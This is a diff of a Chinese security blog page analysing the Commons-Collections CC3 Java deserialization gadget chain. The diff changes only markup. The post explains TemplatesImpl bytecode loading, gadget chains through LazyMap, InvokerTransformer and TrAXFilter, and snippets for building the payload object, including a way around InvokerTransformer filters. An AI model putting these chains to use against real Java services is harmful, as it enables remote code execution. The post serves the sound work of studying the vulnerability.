@@ -16,12 +16,12 @@
     var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="CC3链分析字节码加载 cc3链引入了TemplatesImpl来加载字节码这个概念">
+  <meta name="description" content="CC3链分析 字节码加载 cc3链引入了TemplatesImpl来加载字节码这个概念">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Commons-Collections反序列化链分析-3">
 <meta property="og:url" content="https://ka1t4v.github.io/2022/04/13/Commons-Collections_3%E9%93%BE%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="Ka1t4v">
-<meta property="og:description" content="CC3链分析字节码加载 cc3链引入了TemplatesImpl来加载字节码这个概念">
+<meta property="og:description" content="CC3链分析 字节码加载 cc3链引入了TemplatesImpl来加载字节码这个概念">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220418204815453.png">
 <meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220421195012442.png">
@@ -205,35 +205,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="CC3链分析"><a href="#CC3链分析" class="headerlink" title="CC3链分析"></a>CC3链分析</h1><p><strong>字节码加载</strong></p>
+        <h1>CC3链分析</h1>
+<p><strong>字节码加载</strong></p>
 <p>cc3链引入了TemplatesImpl来加载字节码这个概念</p>
 <span id="more"></span>
-
 <p>一个.java经过编译后生成.class那么.class文件中存放的就是字节码，然后根据字节码来加载相应的java类，源生ClassLoader实现了加载字节码的函数defineClass但是由于其是私有方法，无法被调用，那么只能寻求其他重写defineClass方法的类来调用加载java类</p>
-<p><strong>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</strong> </p>
-<p>这个类中定义了一个内部类 TransletClassLoader </p>
+<p><strong>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</strong></p>
+<p>这个类中定义了一个内部类 TransletClassLoader</p>
 <p>这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个 方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的 protected类型变成了一个default类型的方法，可以被类外部调用</p>
 <p><strong>那么只要调用defineClass方法加载字节码，然后调用显示构造方法newInstance，就可以执行恶意类中的代码</strong></p>
 <p>之前也说过TemplatesImpl的字节码加载调用链</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() </span><br><span class="line">   -&gt; TemplatesImpl#newTransformer() </span><br><span class="line">      -&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">         -&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">            -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
-
 <p>defineClass方法就可以加载一个class，但是并不会进行初始化，即不会执行static代码块中的代码，需要显示调用构造函数才可以进行初始化，正好TransletClassLoader类中不但调用了defineClass方法，并且进行了newInstance，所以使得构造的字节码完成了初始化，造成代码执行</p>
 <p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220418204815453.png" alt="image-20220418204815453"></p>
 <p>由于只有TemplatesImpl#getOutputProperties()和TemplatesImpl#newTransformer()为public函数，所以一般以这两个函数为起点</p>
-<h2 id="构造基本利用链"><a href="#构造基本利用链" class="headerlink" title="构造基本利用链"></a>构造基本利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">-&gt;AnnotationInvocationHandler#readObject()</span><br><span class="line"> -&gt;Map(Proxy)#entrySet()</span><br><span class="line">  -&gt;AnnotationInvocationHandler#invoke()</span><br><span class="line">   -&gt;LazyMap#get()</span><br><span class="line">    -&gt;Transformer#transform()</span><br><span class="line">     -&gt;TemplatesImpl#newTransformer() </span><br><span class="line">      -&gt;arbitrary bytecode load</span><br></pre></td></tr></table></figure>
-
+<h2 id="构造基本利用链"><a class="header-anchor" href="#构造基本利用链">¶</a>构造基本利用链</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">-&gt;AnnotationInvocationHandler#readObject()</span><br><span class="line"> -&gt;Map(Proxy)#entrySet()</span><br><span class="line">  -&gt;AnnotationInvocationHandler#invoke()</span><br><span class="line">   -&gt;LazyMap#get()</span><br><span class="line">    -&gt;Transformer#transform()</span><br><span class="line">     -&gt;TemplatesImpl#newTransformer() </span><br><span class="line">      -&gt;arbitrary bytecode load</span><br></pre></td></tr></table></figure>
 <p>所以说cc3的链source和cc1是一样的还是利用了AnnotationInvocationHandler类</p>
 <p>对于TemplatesImpl类的利用链一般是从<strong>newTransformer</strong>这个方法开始利用的</p>
 <p>那么就可以构造一个TemplatesImpl对象，这里的eval为恶意类的字节码，构造完成后，触发条件就是调用newTransformer函数</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;eval&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
-
 <p>所以只需要修改transformer数组中的加载类就可以了，之前一直使用的Runtime类来执行exec方法，修改后传入TemplatesImpl加载字节码，然后再运行其方法newTransformer即可造成恶意字节码加载</p>
 <p>只需将transformer[]数组修改为</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj), </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>) &#125;;</span><br></pre></td></tr></table></figure>
-
 <p>剩下的和cc1一样</p>
-<h2 id="构造变种利用链"><a href="#构造变种利用链" class="headerlink" title="构造变种利用链"></a>构造变种利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">-&gt;AnnotationInvocationHandler#readObject()</span><br><span class="line"> -&gt;Map(Proxy)#entrySet()</span><br><span class="line">  -&gt;AnnotationInvocationHandler#invoke()</span><br><span class="line">   -&gt;LazyMap#get()</span><br><span class="line">    -&gt;Transformer#transform()</span><br><span class="line">     -&gt;TrAXFilter#TrAXFilter()</span><br><span class="line">       -&gt;TemplatesImpl#newTransformer() </span><br><span class="line">        -&gt;arbitrary bytecode load</span><br></pre></td></tr></table></figure>
-
+<h2 id="构造变种利用链"><a class="header-anchor" href="#构造变种利用链">¶</a>构造变种利用链</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">-&gt;AnnotationInvocationHandler#readObject()</span><br><span class="line"> -&gt;Map(Proxy)#entrySet()</span><br><span class="line">  -&gt;AnnotationInvocationHandler#invoke()</span><br><span class="line">   -&gt;LazyMap#get()</span><br><span class="line">    -&gt;Transformer#transform()</span><br><span class="line">     -&gt;TrAXFilter#TrAXFilter()</span><br><span class="line">       -&gt;TemplatesImpl#newTransformer() </span><br><span class="line">        -&gt;arbitrary bytecode load</span><br></pre></td></tr></table></figure>
 <p>但某些过滤器对于InvokerTransformer方法进行了过滤，使得这个方法不能够再使用了</p>
 <p>那么就需要用到新的实现了Transformer接口的类</p>
 <p><strong>org.apache.commons.collections.functors.InstantiateTransformer</strong></p>
@@ -326,7 +323,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC3%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">CC3链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">1.1.</span> <span class="nav-text">构造基本利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%8F%98%E7%A7%8D%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">1.2.</span> <span class="nav-text">构造变种利用链</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">CC3链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">1.1.</span> <span class="nav-text">构造基本利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%8F%98%E7%A7%8D%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">1.2.</span> <span class="nav-text">构造变种利用链</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
